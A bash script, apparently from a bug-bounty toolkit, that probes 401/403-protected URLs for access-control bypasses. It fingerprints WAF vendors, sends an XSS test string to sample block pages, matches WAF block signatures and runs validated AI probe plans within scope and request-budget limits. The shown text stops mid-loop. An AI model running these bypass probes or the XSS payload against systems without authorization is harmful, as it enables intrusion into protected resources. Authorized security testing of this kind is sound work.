#!/bin/bash
# =============================================================================
# 403/401 Access-Limit Probe — try evidence-linked path/header/method variants
#
# Wraps byp4xx (lobuhi) when present. Falls back to a built-in matrix of the
# most-paid bypass techniques from disclosed reports so it works out of the box.
#
# Usage:
#   ./tools/bypass_403.sh <url>
#   ./tools/bypass_403.sh -l <urls-file>     # one URL per line
#   ./tools/bypass_403.sh --plan PLAN.json --target TARGET
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/external_arsenal.sh"
. "$SCRIPT_DIR/_auth_helper.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; MAG='\033[0;35m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

URL=""; LIST=""; PLAN_FILE=""; AUTH_FILE=""; TARGET_SCOPE=""; QUEUE_MODE=0; PLAN_MAX_REQUESTS=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -l|--list) shift; LIST="${1:-}" ;;
    --plan) shift; PLAN_FILE="${1:-}" ;;
    --auth-file) shift; AUTH_FILE="${1:-}" ;;
    --target) shift; TARGET_SCOPE="${1:-}" ;;
    --max-requests) shift; PLAN_MAX_REQUESTS="${1:-}" ;;
    --queue) QUEUE_MODE=1 ;;
    -h|--help) sed -n '2,13p' "$0"; exit 0 ;;
    *) URL="$1" ;;
  esac
  shift
done

[ -z "$URL" ] && [ -z "$LIST" ] && [ -z "$PLAN_FILE" ] && { err "url, -l <file>, or --plan required"; exit 2; }
[ -n "$URL" ] && [ -n "$LIST" ] && { err "use one of url or -l <file>, not both"; exit 2; }
[ -n "$LIST" ] && [ ! -f "$LIST" ] && { err "list file not found: $LIST"; exit 2; }
[ -n "$PLAN_FILE" ] && { [ -n "$URL" ] || [ -n "$LIST" ]; } && { err "--plan cannot be combined with url or -l <file>"; exit 2; }
[ -z "$PLAN_FILE" ] && [ "$QUEUE_MODE" = "1" ] && { err "--queue requires --plan"; exit 2; }
[ -n "$PLAN_FILE" ] && [ -z "$TARGET_SCOPE" ] && { err "--plan requires --target TARGET"; exit 2; }
[ -n "$PLAN_FILE" ] && [ ! -f "$PLAN_FILE" ] && { err "plan file not found: $PLAN_FILE"; exit 2; }
[ -n "$AUTH_FILE" ] && [ ! -f "$AUTH_FILE" ] && { err "auth file not found: $AUTH_FILE"; exit 2; }
[ -n "$PLAN_MAX_REQUESTS" ] && ! [[ "$PLAN_MAX_REQUESTS" =~ ^[1-9][0-9]*$ ]] && {
  err "--max-requests must be a positive integer"; exit 2;
}
[ -z "$PLAN_FILE" ] && [ -n "$PLAN_MAX_REQUESTS" ] && [ "$PLAN_MAX_REQUESTS" -gt 512 ] && {
  err "fallback --max-requests must be between 1 and 512"; exit 2;
}

# A direct URL is a safe implicit scope. A list is itself the target set for
# network validation; an auth file without an explicit --target keeps its own
# declared target instead of being rebound to the list path.
EXPLICIT_TARGET_SCOPE="$TARGET_SCOPE"
[ -z "$TARGET_SCOPE" ] && [ -n "$URL" ] && TARGET_SCOPE="$URL"
[ -z "$TARGET_SCOPE" ] && [ -n "$LIST" ] && TARGET_SCOPE="$LIST"
AUTH_SCOPE_TARGET="$TARGET_SCOPE"
[ -n "$LIST" ] && [ -z "$EXPLICIT_TARGET_SCOPE" ] && AUTH_SCOPE_TARGET=""

_url_in_scope() {
  PYTHONPATH="$SCRIPT_DIR/..${PYTHONPATH:+:$PYTHONPATH}" \
    python3 - "$1" "$TARGET_SCOPE" <<'PY'
import sys
from urllib.parse import urlparse

from tools.target_paths import url_belongs_to_target

url, target = sys.argv[1:]
parsed = urlparse(url)
if parsed.scheme not in {"http", "https"} or not parsed.netloc:
    raise SystemExit(1)
raise SystemExit(0 if url_belongs_to_target(url, target) else 1)
PY
}

_validate_input_urls() {
  if [ -n "$URL" ]; then
    _url_in_scope "$URL" || { err "url is outside target scope: $URL"; return 2; }
    return 0
  fi
  while IFS= read -r candidate; do
    candidate="${candidate%$'\r'}"
    case "$candidate" in
      ''|'#'*) continue ;;
    esac
    _url_in_scope "$candidate" || { err "list URL is outside target scope: $candidate"; return 2; }
  done < "$LIST"
}

if [ -z "$PLAN_FILE" ] && ! _validate_input_urls; then
  exit 2
fi

TARGET_STORAGE_KEY=$(PYTHONPATH="$SCRIPT_DIR/..${PYTHONPATH:+:$PYTHONPATH}" python3 - "$TARGET_SCOPE" <<'PY'
import sys
from tools.target_paths import target_storage_key
try:
    print(target_storage_key(sys.argv[1]))
except (OSError, ValueError):
    print("unknown-target")
PY
)
TARGET_STORAGE_KEY="${TARGET_STORAGE_KEY:-unknown-target}"
OUT_DIR="${BYPASS_OUT_DIR:-$(pwd)/findings/${TARGET_STORAGE_KEY}/bypass/$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT_DIR"
OUT_DIR_ABS=$(cd "$OUT_DIR" && pwd)
PLAN_RESULTS_FILE="$OUT_DIR/results.jsonl"
PLAN_NORMALIZED_FILE="$OUT_DIR/plan.normalized.tsv"
PLAN_META_FILE="$OUT_DIR/plan.meta.json"
PLAN_SUMMARY_FILE="$OUT_DIR/summary.json"
BYP4XX_USED=0
BYP4XX_TIMEOUT="${BYP4XX_TIMEOUT:-60}"
[[ "$BYP4XX_TIMEOUT" =~ ^[1-9][0-9]*$ ]] || BYP4XX_TIMEOUT=60
mkdir -p "$OUT_DIR/raw"
chmod 700 "$OUT_DIR/raw" 2>/dev/null || true

# Fallback requests include fingerprinting, calibration, and matrix probes.
# Plan mode has its own probe budget and leaves these setup requests outside the
# normalized probe cap for compatibility with existing plan semantics.
REQUEST_COUNT=0
REQUEST_BUDGET=0
if [ -z "$PLAN_FILE" ]; then
  REQUEST_BUDGET="${PLAN_MAX_REQUESTS:-64}"
fi
REQUEST_COUNT_FILE="$OUT_DIR/.request_count"
REQUEST_BUDGET_EXHAUSTED_FILE="$OUT_DIR/.request_budget_exhausted"
printf '0' > "$REQUEST_COUNT_FILE"
rm -f "$REQUEST_BUDGET_EXHAUSTED_FILE"
_request_budget_exhausted() {
  [ -f "$REQUEST_BUDGET_EXHAUSTED_FILE" ]
}
curl() {
  local current_count
  current_count=$(cat "$REQUEST_COUNT_FILE" 2>/dev/null || printf '0')
  if [ "$REQUEST_BUDGET" -gt 0 ] && [ "$current_count" -ge "$REQUEST_BUDGET" ]; then
    : > "$REQUEST_BUDGET_EXHAUSTED_FILE"
    return 28
  fi
  current_count=$((current_count + 1))
  printf '%s' "$current_count" > "$REQUEST_COUNT_FILE"
  command curl "$@"
}

_target_artifact_key() {
  printf '%s' "$1" | sha256sum | awk '{print substr($1, 1, 16)}'
}

_path_parts() {
  python3 - "$1" <<'PY'
import sys
from urllib.parse import urlsplit, urlunsplit

parsed = urlsplit(sys.argv[1])
origin = urlunsplit((parsed.scheme, parsed.netloc, "", "", ""))
path = parsed.path or "/"
if path != "/":
    path = path.rstrip("/") or "/"
if path == "/":
    print(origin)
    print("")
else:
    parent, _, last = path.rpartition("/")
    print(origin + (parent or "/").rstrip("/") or origin)
    print(last)
PY
}

if [ -f "$SCRIPT_DIR/banner.sh" ]; then
  # shellcheck source=banner.sh
  . "$SCRIPT_DIR/banner.sh"
  print_banner "401 / 403 Access-Limit Probe" "${URL:-${TARGET_SCOPE:-$LIST}}" \
      "byp4xx|full bypass matrix when installed" \
      "Built-in|header · method · path · encoding tricks" \
      "Report|matched response codes per technique"
else
  log "401 / 403 Access-Limit Probe: ${URL:-${TARGET_SCOPE:-$LIST}}"
fi

if [ -n "$PLAN_FILE" ]; then
  PLAN_VALIDATE_ARGS=(
    --plan "$PLAN_FILE"
    --target "$TARGET_SCOPE"
    --shell-lines
    --meta-output "$PLAN_META_FILE"
  )
  [ -n "$AUTH_FILE" ] && PLAN_VALIDATE_ARGS+=(--auth-file "$AUTH_FILE")
  [ -n "$PLAN_MAX_REQUESTS" ] && PLAN_VALIDATE_ARGS+=(--max-requests "$PLAN_MAX_REQUESTS")
  if ! python3 "$SCRIPT_DIR/bypass_403_plan.py" "${PLAN_VALIDATE_ARGS[@]}" > "$PLAN_NORMALIZED_FILE"; then
    err "invalid AI probe plan; no requests were sent"
    exit 2
  fi
  [ -s "$PLAN_NORMALIZED_FILE" ] || { err "AI probe plan contains no executable probes"; exit 2; }
  log "validated AI probe plan: $(wc -l < "$PLAN_NORMALIZED_FILE" | tr -d ' ') probes"
fi

if [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
  log "side-effect-capable method probes disabled for the broad scanner; set ALLOW_UNSAFE_HTTP_TESTS=1 to include PUT/PATCH/TRACE"
fi

if [ -z "$PLAN_FILE" ]; then
  if _have byp4xx && [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" = "1" ]; then
    if [ -n "$PLAN_MAX_REQUESTS" ]; then
      log "byp4xx skipped because --max-requests cannot be enforced by the external tool; using the counted built-in matrix"
    elif [ -z "$AUTH_FILE" ] && ! bb_auth_active; then
      log "byp4xx bypass matrix..."
      BYP4XX_RC=0
      if [ -n "$URL" ]; then
        if command -v timeout >/dev/null 2>&1; then
          timeout --signal=TERM "${BYP4XX_TIMEOUT}s" byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || BYP4XX_RC=$?
        else
          byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || BYP4XX_RC=$?
        fi
      else
        if command -v timeout >/dev/null 2>&1; then
          timeout --signal=TERM "${BYP4XX_TIMEOUT}s" byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || BYP4XX_RC=$?
        else
          byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || BYP4XX_RC=$?
        fi
      fi
      BYP4XX_USED=1
      python3 - "$PLAN_SUMMARY_FILE" "$OUT_DIR/byp4xx.meta.json" "$TARGET_SCOPE" "$BYP4XX_RC" "$BYP4XX_TIMEOUT" "$OUT_DIR/byp4xx.txt" <<'PY'
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

summary_path, meta_path, target, rc, timeout_seconds, output_path = sys.argv[1:]
rc = int(rc or 0)
timed_out = rc in {124, 137}
status = "partial" if timed_out or rc else "needs_review"
next_action = (
    "resume with a structured --plan after the external byp4xx run timed out"
    if timed_out
    else "manually review byp4xx.txt; rerun with --plan for structured evidence and queue state"
)
now = datetime.now(timezone.utc).isoformat()
summary = {
    "schema_version": 1,
    "kind": "bypass_403_summary",
    "target": target,
    "status": status,
    "counts": {status: 1},
    "request_count": 0,
    "request_count_known": False,
    "request_budget": 0,
    "budget_enforced": False,
    "external_tool": "byp4xx",
    "external_exit_code": rc,
    "external_output": output_path,
    "generated_at": now,
    "next_action": next_action,
}
metadata = {
    "schema_version": 1,
    "kind": "bypass_403_external_run",
    "target": target,
    "tool": "byp4xx",
    "status": status,
    "exit_code": rc,
    "timeout_seconds": int(timeout_seconds),
    "request_count_known": False,
    "budget_enforced": False,
    "output": output_path,
    "next_action": next_action,
    "generated_at": now,
}
for path, payload in ((Path(summary_path), summary), (Path(meta_path), metadata)):
    temp = path.with_name(f".{path.name}.tmp")
    temp.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    temp.replace(path)
PY
      log "byp4xx output is unparsed and outside request-count accounting; treat it as manual review"
      ok "byp4xx done — see $OUT_DIR/byp4xx.txt"
    else
      log "auth session active; using the AuthSession-aware built-in matrix"
    fi
  fi
fi

# Built-in fallback — most common header / method / path tricks
_fingerprint_waf() {
  local target="$1"
  local hdrs body waf="unknown" wafw00f_raw="" waf_header_file=""
  hdrs=$(curl -sIk --max-time 6 "${AUTH_URL_ARGS[@]}" "$target" 2>/dev/null)
  body=$(curl -sk --max-time 6 "${AUTH_URL_ARGS[@]}" "$target" 2>/dev/null | head -c 4000)
  # wafw00f owns its HTTP client and cannot consume this shell's request
  # budget. Keep the counted fallback deterministic; opt in only when its
  # extra advisory requests are intentional.
  if _have wafw00f && [ "${BYPASS_ALLOW_EXTERNAL_WAF:-0}" = "1" ]; then
    local w wf_args=() idx=0
    # wafw00f supports a header file; keep authenticated detection on the
    # same target and delete the temporary credential material immediately.
    if [ "${#AUTH_URL_ARGS[@]}" -gt 0 ]; then
      waf_header_file=$(mktemp "$OUT_DIR/.waf-headers.XXXXXX")
      chmod 600 "$waf_header_file" 2>/dev/null || true
      while [ "$idx" -lt "${#AUTH_URL_ARGS[@]}" ]; do
        if [ "${AUTH_URL_ARGS[$idx]:-}" = "-H" ] && [ "$((idx + 1))" -lt "${#AUTH_URL_ARGS[@]}" ]; then
          printf '%s\n' "${AUTH_URL_ARGS[$((idx + 1))]}" >> "$waf_header_file"
          idx=$((idx + 2))
        else
          idx=$((idx + 1))
        fi
      done
      wf_args+=(--headers "$waf_header_file")
    fi
    w=$(wafw00f --no-colors --timeout 6 "${wf_args[@]}" "$target" 2>/dev/null | grep -Eo 'is behind .*|No WAF detected.*' | head -1 || true)
    rm -f "$waf_header_file"
    wafw00f_raw="$w"
    case "$w" in
      *Cloudflare*) waf="cloudflare" ;;
      *AWS*|*CloudFront*) waf="aws" ;;
      *Imperva*|*Incapsula*) waf="imperva" ;;
      *Akamai*) waf="akamai" ;;
      *F5*|*BIG-IP*) waf="f5-bigip" ;;
      *Sucuri*) waf="sucuri" ;;
      *ModSecurity*|*NAXSI*) waf="modsecurity" ;;
    esac
    if [ -n "$wafw00f_raw" ]; then
      printf 'target=%s\n%s\n' "$target" "$wafw00f_raw" >> "$OUT_DIR/wafw00f_raw.txt"
    fi
  fi
  echo "$hdrs" | grep -qi "cf-ray\|__cfduid\|cf-cache-status\|cf-request-id" && waf="cloudflare"
  echo "$hdrs" | grep -qi "x-amzn-requestid\|x-amzn-trace-id\|x-amz-cf-id" && waf="aws"
  echo "$hdrs" | grep -qi "akamai-x-\|akamaighost\|x-akamai" && waf="akamai"
  echo "$hdrs" | grep -qi "x-cdn: imperva\|x-iinfo" && waf="imperva"
  echo "$hdrs" | grep -qi "incap_ses\|visid_incap" && waf="imperva"
  echo "$hdrs" | grep -qEi "set-cookie:.*TS[0-9a-f]{6,}" && waf="f5-bigip"
  echo "$hdrs" | grep -qi "x-sucuri-id" && waf="sucuri"
  echo "$body" | grep -qi "mod_security\|ModSecurity\|NAXSI" && waf="modsecurity"
  printf '%s' "$waf"
}

# ---------------------------------------------------------------------------
# Block Baseline Sampling
# ---------------------------------------------------------------------------
_sample_block_baseline() {
  local target="$1"
  local host
  host=$(echo "$target" | grep -oE 'https?://[^/]+')
  local target_key
  target_key=$(_target_artifact_key "$target")
  CURRENT_BLOCK_BASELINE_BODY="$OUT_DIR/.block_baseline.${target_key}.body"
  CURRENT_BLOCK_BASELINE_LEN="$OUT_DIR/.block_baseline.${target_key}.len"
  local bb_body="$CURRENT_BLOCK_BASELINE_BODY"
  local bb_len="$CURRENT_BLOCK_BASELINE_LEN"
  [ -f "$bb_len" ] && return 0  # already sampled this run
  local probe_url="${host}/?_waftest=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
  touch "$bb_body"  # ensure file exists even if curl fails/times-out
  curl -sk --max-time 8 "${AUTH_URL_ARGS[@]}" "$probe_url" -o "$bb_body" 2>/dev/null || true
  local len
  len=$(wc -c < "$bb_body" 2>/dev/null | tr -d ' ')
  printf '%s' "${len:-0}" > "$bb_len"
  log "block baseline: ${len:-0} bytes (from ${host}/?_waftest=...)"
}

_write_local_baseline() {
  local output="$1" target="$2" waf="$3" length
  length=$(cat "${CURRENT_BLOCK_BASELINE_LEN:-}" 2>/dev/null || printf '0')
  BASELINE_OUTPUT="$output" BASELINE_TARGET="$target" BASELINE_WAF="$waf" BASELINE_LENGTH="$length" python3 - <<'PY'
import json
import os
from pathlib import Path

output = Path(os.environ["BASELINE_OUTPUT"])
length = int(os.environ.get("BASELINE_LENGTH", "0") or 0)
payload = {
    "block_baseline": {
        "median_length": length,
        "vendor": os.environ.get("BASELINE_WAF") or None,
        "sample_lengths": [length] if length else [],
        "common_sha256": "",
        "samples": [],
    },
    "normal_baseline": {"median_length": 0, "has_framework_signal": False, "samples": []},
    "calibration_status": "local_sample_only",
    "base_url": os.environ.get("BASELINE_TARGET", ""),
}
temp = output.with_name(f".{output.name}.tmp")
temp.write_text(json.dumps(payload, ensure_ascii=False), encoding="utf-8")
temp.replace(output)
PY
}

# ---------------------------------------------------------------------------
# WAF Block Body Signatures (12 vendors + generic log-id pattern)
# ---------------------------------------------------------------------------
_WAF_BLOCK_REGEX='cf-challenge-form|Just a moment\.\.\.|Attention Required! \| Cloudflare|Sorry, you have been blocked|Cloudflare Ray ID:|Error 1020|_Incapsula_Resource|incident ID:|subject=WAF Block|iframe.*incident_id|AkamaiGHost|Reference #[0-9]|<AccessDenied>|Request blocked.*AWS|Generated by cloudfront|The requested URL was rejected|Please consult with your administrator|[Ss]upport ID:.*[0-9]{10}|mod_security|ModSecurity|Not Acceptable!|Sucuri WebSite Firewall|Powered by Fortinet|Attack ID:.*[0-9]|nginx-wallarm|Wallarm|Barracuda.*blocked|BNI__BARRACUDA'

_GENERIC_LOG_ID_REGEX='(reference|incident|support|log|trace|event|request|error)[[:space:]_-]*(id|number|#)[[:space:]:#]*[a-zA-Z0-9_-]{6,40}'

# ---------------------------------------------------------------------------
# Verdict: is this response a real bypass or still a WAF block?
# Returns 0 (true) = real bypass, 1 (false) = still blocked
# ---------------------------------------------------------------------------
_is_real_bypass() {
  local body_file="$1" code="$2" body_len="${3:-0}"
  # 1. Status must indicate backend was reached
  case "$code" in
    200|201|204|301|302|401|500|502|503) ;;
    *) return 1 ;;
  esac
  # 2. Body must not match any WAF block signature
  if grep -qiE "$_WAF_BLOCK_REGEX" "$body_file" 2>/dev/null; then
    return 1
  fi
  # 3. Body length must diverge from block baseline by >5%
  local bb_len
  bb_len=$(cat "${CURRENT_BLOCK_BASELINE_LEN:-$OUT_DIR/.block_baseline.len}" 2>/dev/null || echo 0)
  if [ "$bb_len" -gt 50 ] && [ "$body_len" -gt 0 ]; then
    local diff
    diff=$(( body_len > bb_len ? body_len - bb_len : bb_len - body_len ))
    local threshold=$(( bb_len / 20 ))
    [ "$diff" -le "$threshold" ] && return 1
  fi
  return 0
}

# ---------------------------------------------------------------------------
# Extract WAF Log IDs from a body file — useful for report writing
# ---------------------------------------------------------------------------
_extract_log_ids() {
  local body_file="$1"
  local ids
  ids=$(grep -oiE "(CF-RAY[: ]+[0-9a-f]{16}-[A-Z]{3}|[Ss]upport[[:space:]_]?ID[: ]+[0-9]{10,}|[Ii]ncident[[:space:]_]?ID[: #]+[0-9]+-[0-9]+|Reference[[:space:]#]+[0-9a-f.]{15,}|x-amzn-RequestId[: ]+[a-f0-9-]{36}|\[id \"[0-9]{6}\"\])" "$body_file" 2>/dev/null | head -5 || true)
  [ -n "$ids" ] && printf '%s' "$ids"
}

# ---------------------------------------------------------------------------
# Optional: delegate classify to Python analyzer when available
# ---------------------------------------------------------------------------
_ANALYZER="$SCRIPT_DIR/waf_response_analyzer.py"
_classify_with_analyzer() {
  local body_file="$1" hdr_file="$2" code="$3" metrics="$4" baseline_json="$5"
  if [ -f "$_ANALYZER" ] && _have python3; then
    python3 "$_ANALYZER" \
      --classify \
      --status "$code" \
      --body "$body_file" \
      --headers "$hdr_file" \
      --baseline "$baseline_json" \
      --metrics "$metrics" \
      --format json 2>/dev/null || echo '{"verdict":"error","score":0,"reason":"analyzer error"}'
  else
    # fallback to bash logic
    local body_len
    body_len=$(echo "$metrics" | cut -d'|' -f2)
    if _is_real_bypass "$body_file" "$code" "$body_len"; then
      printf '{"verdict":"bypassed","score":70,"reason":"bash-fallback: status+body+length check passed"}'
    else
      printf '{"verdict":"blocked","score":20,"reason":"bash-fallback: status/body/length check failed"}'
    fi
  fi
}

_compact_json() {
  # Result text files are line-oriented; keep analyzer JSON on one line while
  # preserving the full structured object in results.jsonl.
  if _have python3; then
    printf '%s' "${1:-}" | python3 -c \
      'import json,sys; print(json.dumps(json.load(sys.stdin), ensure_ascii=False, separators=(",", ":")))' \
      2>/dev/null && return 0
  fi
  printf '%s' "${1:-}" | tr '\n' ' '
}

_auth_args_for_url() {
  local requested_url="${1:-}"
  AUTH_URL_ARGS=()
  while IFS= read -r _auth_header; do
    [ -n "$_auth_header" ] && AUTH_URL_ARGS+=(-H "$_auth_header")
  done < <(PYTHONPATH="$SCRIPT_DIR/..${PYTHONPATH:+:$PYTHONPATH}" \
    AUTH_FILE="$AUTH_FILE" AUTH_SCOPE_TARGET="$AUTH_SCOPE_TARGET" \
    python3 - "$requested_url" <<'PY'
import os
import sys

from tools.auth_session import AuthSession

file_path = os.environ.get("AUTH_FILE") or None
session = AuthSession.from_sources(file=file_path) if file_path else AuthSession.from_env(os.environ)
scope = os.environ.get("AUTH_SCOPE_TARGET", "").strip()
if scope:
    session.bind_target(scope)
if session.allows_url(sys.argv[1]):
    for header in session.headers_list():
        print(header)
PY
  )
}

_capture_target_baseline() {
  local target="$1" target_key
  target_key=$(_target_artifact_key "$target")
  CURRENT_TARGET_BASELINE_BODY="$OUT_DIR/.target_baseline.${target_key}.body"
  CURRENT_TARGET_BASELINE_HEADERS="$OUT_DIR/.target_baseline.${target_key}.headers"
  CURRENT_TARGET_BASELINE_METRICS="$OUT_DIR/.target_baseline.${target_key}.metrics"
  curl -sk --path-as-is -D "$CURRENT_TARGET_BASELINE_HEADERS" -o "$CURRENT_TARGET_BASELINE_BODY" \
    -w "%{http_code}|%{size_download}|%{time_total}" --max-time 8 \
    "${AUTH_URL_ARGS[@]}" "$target" 2>/dev/null > "$CURRENT_TARGET_BASELINE_METRICS" || true
  CURRENT_TARGET_BASELINE_CODE=$(cut -d'|' -f1 "$CURRENT_TARGET_BASELINE_METRICS" 2>/dev/null || printf '0')
}

_b64_decode() {
  printf '%s' "${1:-}" | base64 -d 2>/dev/null || true
}

_append_plan_result() {
  PLAN_RESULT_PATH="$PLAN_RESULTS_FILE" \
  PLAN_RESULT_ID="$1" PLAN_RESULT_KIND="$2" PLAN_RESULT_STATUS="$3" \
  PLAN_RESULT_URL="$4" PLAN_RESULT_METHOD="$5" PLAN_RESULT_CODE="$6" \
  PLAN_RESULT_LENGTH="$7" PLAN_RESULT_REASON="$8" PLAN_RESULT_EXPECTED="$9" \
  PLAN_RESULT_STOP="${10}" PLAN_RESULT_EVIDENCE="${11}" \
  PLAN_RESULT_ANALYZER="${12:-}" PLAN_RESULT_BASELINE_CODE="${13:-0}" \
  PLAN_RESULT_WAF="${14:-}" \
  python3 - <<'PY'
import json
import os
from pathlib import Path

payload = {
    "id": os.environ.get("PLAN_RESULT_ID", ""),
    "kind": os.environ.get("PLAN_RESULT_KIND", ""),
    "status": os.environ.get("PLAN_RESULT_STATUS", "partial"),
    "url": os.environ.get("PLAN_RESULT_URL", ""),
    "method": os.environ.get("PLAN_RESULT_METHOD", "GET"),
    "response_status": int(os.environ.get("PLAN_RESULT_CODE", "0") or 0),
    "body_length": int(os.environ.get("PLAN_RESULT_LENGTH", "0") or 0),
    "reason": os.environ.get("PLAN_RESULT_REASON", ""),
    "expected_signal": os.environ.get("PLAN_RESULT_EXPECTED", ""),
    "stop_condition": os.environ.get("PLAN_RESULT_STOP", ""),
    "evidence_ref": os.environ.get("PLAN_RESULT_EVIDENCE", ""),
}
try:
    payload["baseline_status"] = int(os.environ.get("PLAN_RESULT_BASELINE_CODE", "0") or 0)
except ValueError:
    payload["baseline_status"] = 0
analyzer = os.environ.get("PLAN_RESULT_ANALYZER", "")
if analyzer:
    try:
        decoded = json.loads(analyzer)
    except json.JSONDecodeError:
        decoded = {"verdict": "error", "reason": "invalid analyzer output"}
    if isinstance(decoded, dict):
        payload["analyzer"] = decoded
payload["waf_context"] = os.environ.get("PLAN_RESULT_WAF", "") or "unknown"
path = Path(os.environ["PLAN_RESULT_PATH"])
path.parent.mkdir(parents=True, exist_ok=True)
with path.open("a", encoding="utf-8") as handle:
    handle.write(json.dumps(payload, ensure_ascii=False) + "\n")
PY
}

_plan_status() {
  local analyzer_verdict="$1" code="$2" baseline_code="$3" body_file="$4" markers_json="$5"
  python3 - "$analyzer_verdict" "$code" "$baseline_code" "$body_file" "$markers_json" <<'PY'
import json
import sys
from pathlib import Path

verdict, code, baseline_code, body_path, markers_json = sys.argv[1:]
try:
    code = int(code)
    baseline_code = int(baseline_code)
except ValueError:
    print("partial")
    raise SystemExit(0)
if verdict == "blocked":
    print("blocked")
elif verdict in {"needs_review", "error"}:
    print("needs_review")
elif code in {301, 302, 303, 307, 308}:
    print("needs_review")
elif verdict == "bypassed":
    try:
        markers = json.loads(markers_json or "[]")
    except json.JSONDecodeError:
        markers = []
    body = Path(body_path).read_text(encoding="utf-8", errors="replace")
    protected_status = code in {200, 201, 204} and baseline_code in {401, 403, 404, 405, 415}
    marker_hit = bool(markers) and any(str(marker).lower() in body.lower() for marker in markers)
    print("candidate" if protected_status and marker_hit else "edge_passed")
else:
    print("partial")
PY
}

_fallback_status() {
  local verdict="$1" code="$2" analyzer_json="${3:-}" body_file="${4:-}"
  case "$code" in
    ''|*[!0-9]*|0) echo "partial"; return 0 ;;
  esac
  case "$verdict" in
    blocked) echo "blocked" ;;
    bypassed|edge_passed)
      local baseline_denied=0 protected_status=0
      case "${CURRENT_TARGET_BASELINE_CODE:-0}" in 401|403|404|405|415) baseline_denied=1 ;; esac
      case "$code" in 200|201|204) protected_status=1 ;; esac
      if [ "$baseline_denied" = "1" ] \
        && [ "$protected_status" = "1" ] \
        && printf '%s' "$analyzer_json" | grep -qE '"protected_content_hint"[[:space:]]*:[[:space:]]*true' \
        && [ -s "${CURRENT_TARGET_BASELINE_BODY:-}" ] \
        && [ -s "$body_file" ] \
        && ! cmp -s "$CURRENT_TARGET_BASELINE_BODY" "$body_file"; then
        echo "candidate"
      else
        echo "edge_passed"
      fi
      ;;
    needs_review|error|manual_review) echo "needs_review" ;;
    *) echo "partial" ;;
  esac
}

_run_plan() {
  local target="$1"
  local baseline_body="$OUT_DIR/.target_baseline.body"
  local baseline_headers="$OUT_DIR/.target_baseline.headers"
  local baseline_metrics
  _auth_args_for_url "$target"
  curl -sk --path-as-is -D "$baseline_headers" -o "$baseline_body" \
    -w "%{http_code}|%{size_download}|%{time_total}" --max-time 8 \
    "${AUTH_URL_ARGS[@]}" "$target" 2>/dev/null > "$OUT_DIR/.target_baseline.metrics" || true
  baseline_metrics=$(cat "$OUT_DIR/.target_baseline.metrics" 2>/dev/null || printf '0|0|0')
  local baseline_code="${baseline_metrics%%|*}"
  local waf
  waf=$(_fingerprint_waf "$target")
  log "AI plan mode; WAF context: $waf"
  local waf_detector="unavailable"
  if _have wafw00f; then
    [ "${BYPASS_ALLOW_EXTERNAL_WAF:-0}" = "1" ] && waf_detector="available" || waf_detector="available_skipped_budget"
  fi
  printf 'target=%s waf=%s wafw00f=%s\n' "$target" "$waf" "$waf_detector" >> "$OUT_DIR/waf_fingerprint.txt"
  _sample_block_baseline "$target"
  local baseline_json="$OUT_DIR/.block_baseline.$(_target_artifact_key "$target").json"
  if [ -f "$_ANALYZER" ] && _have python3; then
    local origin
    origin=$(printf '%s' "$target" | grep -oE 'https?://[^/]+' || true)
    python3 "$_ANALYZER" --calibrate "$origin" --output "$baseline_json" --quiet 2>/dev/null || true
  fi

  while IFS=$'\t' read -r id_b64 kind_b64 method_b64 url_b64 headers_b64 markers_b64 reason_b64 expected_b64 stop_b64 unsafe_b64; do
    [ -n "$id_b64" ] || continue
    local probe_id kind method probe_url headers_json markers_json reason expected stop unsafe
    probe_id=$(_b64_decode "$id_b64")
    kind=$(_b64_decode "$kind_b64")
    method=$(_b64_decode "$method_b64")
    probe_url=$(_b64_decode "$url_b64")
    headers_json=$(_b64_decode "$headers_b64")
    markers_json=$(_b64_decode "$markers_b64")
    reason=$(_b64_decode "$reason_b64")
    expected=$(_b64_decode "$expected_b64")
    stop=$(_b64_decode "$stop_b64")
    unsafe=$(_b64_decode "$unsafe_b64")
    if [ "$unsafe" = "True" ] && [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
      printf '%s|%s|%s|unsafe-disabled|0|{"verdict":"manual_review","reason":"unsafe method requires ALLOW_UNSAFE_HTTP_TESTS=1"}\n' \
        "$probe_id" "$probe_url" "$method" >> "$OUT_DIR/bypass_manual_review.txt"
      _append_plan_result "$probe_id" "$kind" "needs_review" "$probe_url" "$method" 0 0 \
        "unsafe method requires manual review" "$expected" "$stop" ""
      continue
    fi

    local body_file header_file metrics code body_len analyzer_json analyzer_record analyzer_verdict status safe_id evidence_ref
    body_file=$(mktemp)
    header_file=$(mktemp)
    _auth_args_for_url "$probe_url"
    local request_args=( -sk --path-as-is -D "$header_file" -o "$body_file" \
      -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 -X "$method" )
    request_args+=("${AUTH_URL_ARGS[@]}")
    while IFS= read -r plan_header; do
      [ -n "$plan_header" ] && request_args+=(-H "$plan_header")
    done < <(python3 - "$headers_json" <<'PY'
import json
import sys
try:
    headers = json.loads(sys.argv[1] or "{}")
except json.JSONDecodeError:
    headers = {}
for name, value in headers.items():
    print(f"{name}: {value}")
PY
    )
    metrics=$(curl "${request_args[@]}" "$probe_url" 2>/dev/null || printf '0|0|0')
    code="${metrics%%|*}"
    body_len=$(printf '%s' "$metrics" | cut -d'|' -f2)
    analyzer_json=$(_classify_with_analyzer "$body_file" "$header_file" "$code" "$metrics" "$baseline_json")
    analyzer_record=$(_compact_json "$analyzer_json")
